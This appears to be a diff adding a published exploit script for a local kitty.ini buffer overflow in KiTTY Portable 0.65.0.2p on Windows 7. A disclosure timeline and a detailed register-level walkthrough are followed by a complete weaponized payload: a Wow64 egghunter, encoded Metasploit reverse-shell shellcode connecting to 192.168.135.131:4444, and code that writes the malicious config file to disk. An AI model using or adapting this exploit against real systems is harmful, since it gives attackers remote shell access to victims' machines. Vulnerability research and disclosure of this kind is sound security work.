@@ -1,0 +1,304 @@
+# Exploit Title: KiTTY Portable <= 0.65.0.2p Local kitty.ini Overflow (Wow64 Egghunter Win7)
+# Date: 28/12/2015
+# Exploit Author: Guillaume Kaddouch
+# 	Twitter: @gkweb76
+#	Blog: http://networkfilter.blogspot.com 
+#	GitHub: https://github.com/gkweb76/exploits
+# Vendor Homepage: http://www.9bis.net/kitty/
+# Software Link: http://sourceforge.net/projects/portableapps/files/KiTTY%20Portable/KiTTYPortable_0.65.0.2_English.paf.exe
+# Version: 0.65.0.2p
+# Tested on: Windows 7 Pro x64 (FR)
+# Category: Local
+
+"""
+Disclosure Timeline:
+--------------------
+2015-09-18: Vulnerability discovered
+2015-09-26: Vendor contacted
+2015-09-28: Vendor answer
+2015-10-09: KiTTY 0.65.0.3p released : unintentionally (vendor said) preventing exploit from working, without fixing the core vulnerability
+2015-10-20: KiTTY 0.65.1.1p released, vendor fix, but app can still be crashed using same vulnerability on another kitty.ini parameter
+2015-11-15: KiTTY 0.66.6.1p released, seems fixed
+2015-12-28: exploit published
+
+Description :
+-------------
+A local overflow exists in kitty.ini file used by KiTTY portable. By writing a 1048 bytes string into 
+the kitty.ini file, an overflow occurs that makes Kitty crashing. At time of the crash, EIP is 
+overwritten at offset 1036. As all DLLs are ALSR and DEP protected, and rebased, we can only use 
+kitty_portable.exe addresses, which start with a NULL. Successful exploitation will grant an
+attacker a reverse shell on Windows 7 Pro x64.
+
+Win7  -> Code Execution
+
+Instructions:
+-------------
+- Run exploit
+- Launch KiTTY
+
+Exploitation:
+-------------
+As EDX register points to our buffer, it seems like using a return address pointing to a 
+JMP EDX instruction would do the trick. However this is not the case, because of the address containing
+a NULL byte, our 1048 bytes buffer is truncated to 1039 bytes, and an access violation occurs before EIP could be
+overwritten:
+
+EAX = 00000041
+00533DA2     0000           ADD BYTE PTR DS:[EAX],AL <---- Access violation when writing to [EAX]
+00533DA4     00             DB 00
+
+Increasing our initial buffer by 4 bytes (1052 bytes) gives us another crash,
+but neither EIP nor SEH are overwritten. We end up with another memory access violation, which although looking
+like a deadend, is in fact exploitable:
+
+ECX and EBX points to our buffer
+EDX and EDI are overwritten by our buffer
+
+EDI = 41414141
+764F8DD2   8917             MOV DWORD PTR DS:[EDI],EDX <---- Access violation when writing to [EDI]
+
+Although we do not have control over the execution flow (EIP), we have at least control of the value written to EDI
+at offset 1048. We can write a valid memory address into EDI, allowing the program to continue 
+its execution. One such address is the address ESP points to on the stack: 0x0028C4F8.
+Let's take a closer look to the code executed:
+
+
+764F8DB8   BA FFFEFE7E      MOV EDX,7EFEFEFF			<-------- (3) JMP back here
+764F8DBD   8B01             MOV EAX,DWORD PTR DS:[ECX]
+764F8DBF   03D0             ADD EDX,EAX
+764F8DC1   83F0 FF          XOR EAX,FFFFFFFF
+764F8DC4   33C2             XOR EAX,EDX
+764F8DC6   8B11             MOV EDX,DWORD PTR DS:[ECX]
+764F8DC8   83C1 04          ADD ECX,4
+764F8DCB   A9 00010181      TEST EAX,81010100
+764F8DD0   75 07            JNZ SHORT msvcrt.764F8DD9
+
+764F8DD2   8917             MOV DWORD PTR DS:[EDI],EDX  <------- (1) We start HERE
+764F8DD4   83C7 04          ADD EDI,4
+764F8DD7   EB DF            JMP SHORT msvcrt.764F8DB8   <------- (2) jump back above
+
+1) Value from EDX is copied to the stack where EDI points to, then EDI is incremented and points to next address
+2) The execution jumps back at the beginning of the code block, overwrites our source register EDX with 7EFEFEFF,
+overwrites EAX with 41414141 (ECX point to our buffer), restore EDX with 41414141, increment ECX pointing to our
+buffer by 4, pointing to our next buffer value, and starting all over again. Also there is a very interesting instruction 
+following this code:
+
+764F8DD2   8917             MOV DWORD PTR DS:[EDI],EDX    <------- We are HERE
+764F8DD4   83C7 04          ADD EDI,4
+764F8DD7   EB DF            JMP SHORT msvcrt.764F8DB8
+764F8DD9   84D2             TEST DL,DL
+764F8DDB   74 32            JE SHORT msvcrt.764F8E0F
+764F8DDD   84F6             TEST DH,DH
+764F8DDF   74 15            JE SHORT msvcrt.764F8DF6
+764F8DE1   F7C2 0000FF00    TEST EDX,0FF0000
+764F8DE7   75 16            JNZ SHORT msvcrt.764F8DFF
+764F8DE9   66:8917          MOV WORD PTR DS:[EDI],DX
+764F8DEC   8B4424 08        MOV EAX,DWORD PTR SS:[ESP+8]
+764F8DF0   C647 02 00       MOV BYTE PTR DS:[EDI+2],0
+764F8DF4   5F               POP EDI
+764F8DF5   C3               RETN							<------- We want that !
+
+This code block happily copies our entire buffer chunk by chunk to the stack, and is later followed by a RET instruction.
+If there could be a way to copy our buffer on the stack and make ESP pointing to a predictable part or our buffer, the RET would
+give us the control of the execution flow.
+
+When the copy operation is finished, the code crashes again and this time EIP is overwritten with 41414141, and ESP
+has the address 0x0028C500 pointing toward the near begining of our buffer (offset 8). The RET has been reached, wonderful :-)
+
+However, we cannot write a usable address here to jump somewhere else as a NULL byte would truncate our entire buffer and no 
+crash would occur... The goal here would be to find the correct address to put into EDI so that ESP will point to the end
+of our buffer, where we will be able to use another address, containing a NULL, to jump somewhere else and
+take back control of the execution flow. However our buffer is already terminated by a NULL byte address for EDI.
+
+1) We cannot make ESP points anywhere in the middle of our buffer, as we can only use addresses containing a NULL
+2) We cannot add another valid NULL containing address at the end of our buffer, as a stack address containing a NULL is there 
+for EDI
+3) EDI contains an address already pointing to the start of our buffer, thanks to the copy operation, our only chance is to try
+to make ESP pointing to it when the crash happens.
+
+After testing by incrementing or decrementing EDI address value, it appears ESP always point to 0x0028C500 at time 
+of the crash. This means we can calculate the correct offset to align EDI address with ESP, just before the RET happens to make 
+EIP following that address. The EDI address to achieve that is: (EIP)0x0028C500 - (buffer length)1052 = 0x0028C0E4. 
+As our buffer is copied onto a NULLs filled zone, we can omit the NULL byte and set EDI to '\xE4\xC0\x28'.
+
+To sume it up:
+1) First crash with EIP overwritten seems not exploitable
+2) Second crash does not have EIP nor SEH overwritten (memory access violation), we only have "control" over some registers
+3) Tweaking values of EDX and EDI, makes the program continue execution and copying our buffer onto the stack
+4) The RET instruction is reached and execution crashes again
+5) We find an EDI address value which is valid for a) copying our buffer on stack, b) is aligning itself with ESP at the correct
+offset and c) will appear on the stack and be used by the RET instruction, giving us finally control over the execution flow.
+
+That is like being forbidden to enter a building, but we give two bags (EDI + EDX) to someone authorized who enters the building,
+who do all the work for us inside, and goes out back to us with the vault key (EIP).
+
+Finally, as the memory area we land in is not reliable for bigger shellcode such as reverse shell, using an egg hunter is required.
+"""
+
+egg = "w00t" # \x77\x30\x30\x74
+
+# Wow64 Egghunter - Corelan Team
+# Written by Lincoln (lincoln@corelan.be)
+# Size: 46 bytes
+egghunter = (
+"\x31\xdb"                            # XOR EBX, EBX
+"\x53"                                # PUSH EBX
+"\x53"                                # PUSH EBX
+"\x53"                                # PUSH EBX
+"\x53"                                # PUSH EBX
+"\xb3\xc0"			      			  # MOV BL,0xc0
+"\x66\x81\xCA\xFF\x0F"                # OR DX,0FFF
+"\x42"                                # INC EDX
+"\x52"                                # PUSH EDX
+"\x6A\x26"    						  # PUSH 26 
+"\x58"                                # POP EAX
+"\x33\xC9"     						  # XOR ECX,ECX
+"\x8B\xD4"      					  # MOV EDX,ESP
+"\x64\xff\x13"         				  # CALL DWORD PTR FS:[ebx]
+"\x5e"                                # POP ESI
+"\x5a"                                # POP EDX
+"\x3C\x05"      					  # CMP AL,5
+"\x74\xe9"      					  # JE SHORT egg.0043F000
+"\xB8\x77\x30\x30\x74"       		  # MOV EAX,74303077 w00t
+"\x8B\xFA"                            # MOV EDI,EDX
+"\xAF"                                # SCAS DWORD PTR ES:[EDI]
+"\x75\xe4"                            # JNZ SHORT egg.0043F001
+"\xAF"                                # SCAS DWORD PTR ES:[EDI]
+"\x75\xe1"                            # JNZ SHORT 0043F001
+"\xFF\xE7"                            # JMP EDI
+)
+
+# Metasploit Reverse Shell 192.168.135.131:4444 (replace it with any shellcode you want)
+# Encoder: x86/alpha_mixed
+# Bad chars: \x00\x0a\x0d\x21\x11\x1a\x01\x31
+# Size: 710 bytes
+shellcode = (
+"\x89\xe3\xda\xd4\xd9\x73\xf4\x5f\x57\x59\x49\x49\x49\x49\x49"
+"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
+"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
+"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
+"\x6b\x4c\x48\x68\x4c\x42\x45\x50\x57\x70\x67\x70\x33\x50\x4e"
+"\x69\x49\x75\x35\x61\x39\x50\x53\x54\x6c\x4b\x32\x70\x76\x50"
+"\x6c\x4b\x56\x32\x46\x6c\x4c\x4b\x73\x62\x46\x74\x4c\x4b\x72"
+"\x52\x54\x68\x64\x4f\x6f\x47\x33\x7a\x57\x56\x44\x71\x49\x6f"
+"\x6c\x6c\x55\x6c\x63\x51\x33\x4c\x77\x72\x56\x4c\x61\x30\x6a"
+"\x61\x4a\x6f\x76\x6d\x66\x61\x6f\x37\x6b\x52\x6a\x52\x56\x32"
+"\x73\x67\x4c\x4b\x62\x72\x46\x70\x6c\x4b\x33\x7a\x67\x4c\x4c"
+"\x4b\x30\x4c\x76\x71\x64\x38\x49\x73\x53\x78\x77\x71\x4b\x61"
+"\x53\x61\x4c\x4b\x30\x59\x51\x30\x35\x51\x4a\x73\x4c\x4b\x47"
+"\x39\x67\x68\x68\x63\x36\x5a\x33\x79\x6e\x6b\x44\x74\x6c\x4b"
+"\x36\x61\x6b\x66\x44\x71\x49\x6f\x4e\x4c\x49\x51\x38\x4f\x56"
+"\x6d\x66\x61\x6f\x37\x56\x58\x4b\x50\x51\x65\x59\x66\x54\x43"
+"\x43\x4d\x68\x78\x45\x6b\x63\x4d\x75\x74\x33\x45\x4a\x44\x30"
+"\x58\x6c\x4b\x71\x48\x35\x74\x47\x71\x5a\x73\x65\x36\x6c\x4b"
+"\x76\x6c\x42\x6b\x6e\x6b\x30\x58\x55\x4c\x36\x61\x79\x43\x6c"
+"\x4b\x55\x54\x6e\x6b\x37\x71\x7a\x70\x6b\x39\x70\x44\x71\x34"
+"\x65\x74\x43\x6b\x53\x6b\x73\x51\x73\x69\x42\x7a\x73\x61\x4b"
+"\x4f\x4d\x30\x73\x6f\x53\x6f\x32\x7a\x4c\x4b\x62\x32\x68\x6b"
+"\x6e\x6d\x63\x6d\x30\x68\x50\x33\x44\x72\x63\x30\x53\x30\x33"
+"\x58\x50\x77\x43\x43\x45\x62\x71\x4f\x30\x54\x43\x58\x72\x6c"
+"\x54\x37\x34\x66\x73\x37\x6b\x4f\x6e\x35\x4e\x58\x7a\x30\x76"
+"\x61\x37\x70\x65\x50\x64\x69\x6a\x64\x32\x74\x72\x70\x50\x68"
+"\x34\x69\x4d\x50\x62\x4b\x45\x50\x79\x6f\x68\x55\x46\x30\x56"
+"\x30\x66\x30\x62\x70\x73\x70\x72\x70\x63\x70\x72\x70\x42\x48"
+"\x38\x6a\x74\x4f\x6b\x6f\x6b\x50\x79\x6f\x69\x45\x6f\x67\x63"
+"\x5a\x65\x55\x50\x68\x79\x50\x6c\x68\x6d\x57\x4d\x53\x32\x48"
+"\x36\x62\x57\x70\x67\x61\x43\x6c\x6b\x39\x4b\x56\x71\x7a\x76"
+"\x70\x73\x66\x51\x47\x43\x58\x6f\x69\x59\x35\x54\x34\x43\x51"
+"\x79\x6f\x49\x45\x4e\x65\x4f\x30\x63\x44\x44\x4c\x79\x6f\x50"
+"\x4e\x56\x68\x53\x45\x7a\x4c\x73\x58\x6c\x30\x4e\x55\x4c\x62"
+"\x46\x36\x69\x6f\x38\x55\x55\x38\x53\x53\x42\x4d\x70\x64\x55"
+"\x50\x4e\x69\x68\x63\x33\x67\x72\x77\x76\x37\x36\x51\x4a\x56"
+"\x61\x7a\x54\x52\x46\x39\x53\x66\x4b\x52\x69\x6d\x71\x76\x49"
+"\x57\x30\x44\x46\x44\x77\x4c\x57\x71\x47\x71\x4e\x6d\x47\x34"
+"\x37\x54\x62\x30\x58\x46\x77\x70\x53\x74\x43\x64\x52\x70\x42"
+"\x76\x43\x66\x33\x66\x51\x56\x53\x66\x72\x6e\x66\x36\x46\x36"
+"\x52\x73\x72\x76\x30\x68\x52\x59\x48\x4c\x47\x4f\x4b\x36\x6b"
+"\x4f\x59\x45\x6f\x79\x4b\x50\x52\x6e\x51\x46\x57\x36\x39\x6f"
+"\x66\x50\x75\x38\x55\x58\x4d\x57\x45\x4d\x51\x70\x69\x6f\x4e"
+"\x35\x6f\x4b\x78\x70\x6c\x75\x6d\x72\x42\x76\x32\x48\x4d\x76"
+"\x7a\x35\x4d\x6d\x6d\x4d\x79\x6f\x68\x55\x57\x4c\x65\x56\x71"
+"\x6c\x74\x4a\x6d\x50\x69\x6b\x4b\x50\x70\x75\x55\x55\x4f\x4b"
+"\x72\x67\x34\x53\x73\x42\x72\x4f\x73\x5a\x63\x30\x52\x73\x4b"
+"\x4f\x39\x45\x41\x41"
+)
+
+# Stack address where to copy our shellcode, with an offset of ESP - 1052
+edi 	= '\xE4\xC0\x28' # 0x0028C0E4 WIN7 Pro x64
+
+nops	= '\x90' * 8
+eggmark = egg * 2
+padding = '\x41' * (1048 - len(nops) - len(egghunter))
+
+# The memory area we land makes bigger shellcode crashes after being decoded
+# Using a 46 bytes egg hunter and putting our shellcode somewhere else solves this problem
+payload1 = nops + egghunter + padding + edi  # Egg Hunter
+payload2 = eggmark + nops + shellcode		 # Final Shellcode
+
+# Kitty.ini configuration file
+buffer ="[ConfigBox]\n"
+buffer +="height=22\n"
+buffer +="filter=yes\n"
+buffer +="#default=yes\n"
+buffer +="#noexit=no\n"
+buffer +="[KiTTY]\n"
+buffer +="backgroundimage=no\n"
+buffer +="capslock=no\n"
+buffer +="conf=yes\n"
+buffer +="cygterm=yes\n"
+buffer +="icon=no\n"
+buffer +="#iconfile=\n"
+buffer +="#numberoficons=45\n"
+buffer +="paste=no\n"
+buffer +="print=yes\n"
+buffer +="scriptfilefilter=\n"
+buffer +="size=no\n"
+buffer +="shortcuts=yes\n"
+buffer +="mouseshortcuts=yes\n"
+buffer +="hyperlink=no\n"
+buffer +="transparency=no\n"
+buffer +="#configdir=\n"
+buffer +="#downloaddir=\n"
+buffer +="#uploaddir=\n"
+buffer +="remotedir=\n"
+buffer +="#PSCPPath=\n"
+buffer +="#PlinkPath=\n"
+buffer +="#WinSCPPath=\n"
+buffer +="#CtHelperPath=\n"
+buffer +="#antiidle== \k08\\\n"
+buffer +="#antiidledelay=60\n"
+buffer +="sshversion=" + payload2 + "\n"	# Shellcode
+buffer +="#WinSCPProtocol=sftp\n"
+buffer +="#autostoresshkey=no\n"
+buffer +="#UserPassSSHNoSave=no\n"
+buffer +="KiClassName=" + payload1 + "\n" 	# Egg Hunter
+buffer +="#ReconnectDelay=5\n"
+buffer +="savemode=dir\n"
+buffer +="bcdelay=0\n"
+buffer +="commanddelay=5\n"
+buffer +="initdelay=2.0\n"
+buffer +="internaldelay=10\n"
+buffer +="slidedelay=0\n"
+buffer +="wintitle=yes\n"
+buffer +="zmodem=yes\n"
+buffer +="[Print]\n"
+buffer +="height=100\n"
+buffer +="maxline=60\n"
+buffer +="maxchar=85\n"
+buffer +="[Folder]\n"
+buffer +="[Launcher]\n"
+buffer +="reload=yes\n"
+buffer +="[Shortcuts]\n"
+buffer +="print={SHIFT}{F7}\n"
+buffer +="printall={F7}\n"
+
+# Location of our Kitty.ini file (modify with your KiTTY directory)
+file = "C:\\kitty\\App\\KiTTY\\kitty.ini"
+try:
+	print "[*] Writing to %s (%s bytes)" % (file, len(buffer))
+	f = open(file,'w')
+	f.write(buffer)
+	f.close()
+	print "[*] Done!"
+except:
+    print "[-] Error writing %s" % file
